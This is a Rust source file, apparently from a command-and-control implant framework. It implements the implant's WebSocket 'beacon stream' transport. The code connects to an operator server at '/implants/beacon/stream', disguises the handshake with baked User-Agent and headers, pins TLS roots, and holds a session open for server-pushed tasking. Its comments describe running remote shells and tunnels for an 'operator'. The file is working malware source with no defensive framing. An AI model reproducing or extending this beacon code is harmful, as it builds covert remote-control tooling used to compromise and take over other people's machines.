use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::Duration;

use rustls::pki_types::ServerName;
use tungstenite::client::IntoClientRequest;
use tungstenite::protocol::Message as WsMessage;
use tungstenite::WebSocket;

use super::live::{self, LiveChannel};
use super::Contact;
use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};
use crate::wire::Frame;

/// The WebSocket stream (architecture.md Sec 8, the web posture's
/// interactive tier): the web family's live session, over
/// a WebSocket on a web front -- server-push tasking the moment it queues.
/// Every message is the sealed-or-plaintext framed-frames body the POST
/// cycle carries, so the seal, counter, and frame grammar are the session's
/// own, whichever carriage they ride; the held-session discipline itself is
/// the shared live module's. A dropped connection is a reconnect, not a
/// termination; undelivered results replay on the next one (first-wins
/// server-side).
///
/// The dial is deliberately hands-on: the TLS stream is ours (rustls over a
/// TcpStream, the pinned CAs as its only roots), and tungstenite runs the
/// WebSocket handshake over it -- no TLS feature entanglement, the same
/// pinning rule as the poll carriage.
pub struct Stream {
    authority: String,
    secure: bool,
    tls: Option<Arc<rustls::ClientConfig>>,
    /// The baked presentation the handshake request presents (the same
    /// UA-and-headers set the POST legs apply): non-empty entries only --
    /// tungstenite's handshake sends no default User-Agent to hide.
    presentation_headers: Vec<(String, String)>,
}

impl Stream {
    pub fn new(dial: &str, profile: &Profile) -> Stream {
        let secure = dial.starts_with("https://");
        let authority = match dial.find("://") {
            Some(at) => dial[at + 3..].split('/').next().unwrap_or("").to_string(),
            None => dial.to_string(),
        };
        let tls = if secure {
            Some(Arc::new(
                rustls::ClientConfig::builder_with_provider(Arc::new(
                    rustls::crypto::ring::default_provider(),
                ))
                .with_safe_default_protocol_versions()
                .expect("rustls protocol versions")
                .with_root_certificates(super::tls_roots(profile))
                .with_no_client_auth(),
            ))
        } else {
            None
        };
        Stream {
            authority,
            secure,
            tls,
            presentation_headers: presentation_headers(profile),
        }
    }

    /// dials and runs the WebSocket handshake, returning the live socket.
    fn connect(&self) -> Result<WebSocket<Box<dyn ReadWrite>>, ContactError> {
        let tcp = TcpStream::connect(&self.authority)
            .map_err(|e| ContactError::Transport(format!("dial {}: {e}", self.authority)))?;
        tcp.set_nodelay(true).ok();

        let request = format!(
            "{}://{}/implants/beacon/stream",
            if self.secure { "wss" } else { "ws" },
            self.authority
        )
        .as_str()
        .into_client_request()
        .map_err(|e| ContactError::Transport(e.to_string()))?;
        let mut request = request;
        for (name, value) in &self.presentation_headers {
            // A name or value the HTTP grammar refuses is a bake the shell
            // never should have carried; skip it rather than fail the dial.
            if let (Ok(name), Ok(value)) = (
                tungstenite::http::HeaderName::from_bytes(name.as_bytes()),
                tungstenite::http::HeaderValue::from_str(value),
            ) {
                request.headers_mut().insert(name, value);
            }
        }

        let socket: Box<dyn ReadWrite> = match &self.tls {
            Some(config) => {
                let name = ServerName::try_from(
                    self.authority
                        .split(':')
                        .next()
                        .unwrap_or(&self.authority)
                        .to_string(),
                )
                .map_err(|e| ContactError::Transport(format!("server name: {e}")))?;
                let connection = rustls::ClientConnection::new(Arc::clone(config), name)
                    .map_err(|e| ContactError::Transport(e.to_string()))?;
                Box::new(rustls::StreamOwned::new(connection, tcp))
            }
            None => Box::new(tcp),
        };
        tungstenite::client(request, socket)
            .map(|(socket, _)| socket)
            .map_err(|e| ContactError::Transport(format!("websocket handshake: {e}")))
    }
}

/// The handshake's presentation entries: the baked headers plus the baked
/// User-Agent (when set) ahead of them, so a headers entry naming
/// "User-Agent" still wins -- the same precedence the POST legs hold.
fn presentation_headers(profile: &Profile) -> Vec<(String, String)> {
    let mut headers = Vec::with_capacity(profile.headers.len() + 1);
    if !profile.user_agent.is_empty() {
        headers.push(("User-Agent".to_string(), profile.user_agent.clone()));
    }
    headers.extend(profile.headers.iter().cloned());
    headers
}

/// The stream shapes the session loop reads and writes: either carriage of
/// the underlying transport, boxed so the socket type is one thing. The
/// read timeout is the channel tick's vehicle -- a park that can wake on
/// something other than the server's push.
trait ReadWrite: Read + Write + Send {
    fn set_read_timeout(&self, timeout: Option<Duration>) -> std::io::Result<()>;
}

impl ReadWrite for TcpStream {
    fn set_read_timeout(&self, timeout: Option<Duration>) -> std::io::Result<()> {
        TcpStream::set_read_timeout(self, timeout)
    }
}

impl ReadWrite for rustls::StreamOwned<rustls::ClientConnection, TcpStream> {
    fn set_read_timeout(&self, timeout: Option<Duration>) -> std::io::Result<()> {
        self.sock.set_read_timeout(timeout)
    }
}

impl Contact for Stream {
    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        let mut socket = self.connect()?;

        // The implant speaks first: the request-body shape with the
        // handshake frame alone.
        let handshake = [session.handshake_frame()];
        WsLive {
            socket: &mut socket,
        }
        .send_batch(session, &handshake)?;

        // The server answers the response shape: the handshake response
        // first, possibly beside tasking in the same message. The read
        // blocks for the message -- no tick is armed yet.
        let inbound = WsLive {
            socket: &mut socket,
        }
        .recv(session)?
        .ok_or(ContactError::Protocol(
            "the stream closed before the handshake response",
        ))?;
        let first = inbound.first().ok_or(ContactError::Protocol(
            "the stream closed before the handshake response",
        ))?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }

        let mut channel = WsLive {
            socket: &mut socket,
        };
        let outcome = live::held_handshake(session, &mut channel, &inbound[1..], acks);

        // The stream's death ends every channel it carried (the wire
        // contract's session-scoped lifetime): the shells are killed, the
        // tunnels close, and their results never come -- the tasks stay
        // dispatched for the operator to reissue on a later contact.
        session.channels.reap();
        // The session loop parks forever; the only way out is the stream's
        // death, a dropped contact the run loop retries on its walk.
        outcome.map(|()| Attempt::Crossed)
    }
}

/// The held session over the WebSocket: the byte exchange the shared live
/// discipline runs.
struct WsLive<'a> {
    socket: &'a mut WebSocket<Box<dyn ReadWrite>>,
}

impl LiveChannel for WsLive<'_> {
    fn send_batch(&mut self, session: &mut Session, frames: &[Frame]) -> Result<(), ContactError> {
        let (body, _) = session.encode_outgoing(frames);
        // Sealed bodies ride as text (the base64 string), plaintext as binary --
        // the exact message typing the wire contract sets.
        let message = if session.seal.is_some() {
            WsMessage::Text(String::from_utf8_lossy(&body).into_owned().into())
        } else {
            WsMessage::Binary(body.into())
        };
        self.socket
            .send(message)
            .map_err(|e| ContactError::Transport(e.to_string()))
    }

    fn recv(&mut self, session: &mut Session) -> Result<Option<Vec<Frame>>, ContactError> {
        let body = loop {
            match self.socket.read() {
                Ok(WsMessage::Text(text)) => break text.as_bytes().to_vec(),
                Ok(WsMessage::Binary(bytes)) => break bytes.as_ref().to_vec(),
                Ok(WsMessage::Close(_)) => {
                    return Err(ContactError::Protocol("the server closed the stream"))
                }
                // Control frames answer themselves inside tungstenite's read.
                Ok(WsMessage::Ping(_) | WsMessage::Pong(_) | WsMessage::Frame(_)) => continue,
                Err(error) if is_read_tick(&error) => return Ok(None),
                Err(e) => return Err(ContactError::Transport(e.to_string())),
            }
        };
        session
            .decode_incoming(&body)
            .map(Some)
            .ok_or(ContactError::Protocol(
                "the beacon message did not verify under the baked key",
            ))
    }

    fn arm_tick(&mut self, on: bool) {
        let _ = self.socket.get_ref().set_read_timeout(if on {
            Some(live::CHANNEL_TICK)
        } else {
            None
        });
    }
}

/// Whether a failed read is the read-timeout tick rather than a dead
/// socket: the timeout surfaces as WouldBlock (or TimedOut) through the
/// underlying stream, and tungstenite passes it through as an io error.
fn is_read_tick(error: &tungstenite::Error) -> bool {
    matches!(
        error,
        tungstenite::Error::Io(e)
            if e.kind() == std::io::ErrorKind::WouldBlock
                || e.kind() == std::io::ErrorKind::TimedOut
    )
}
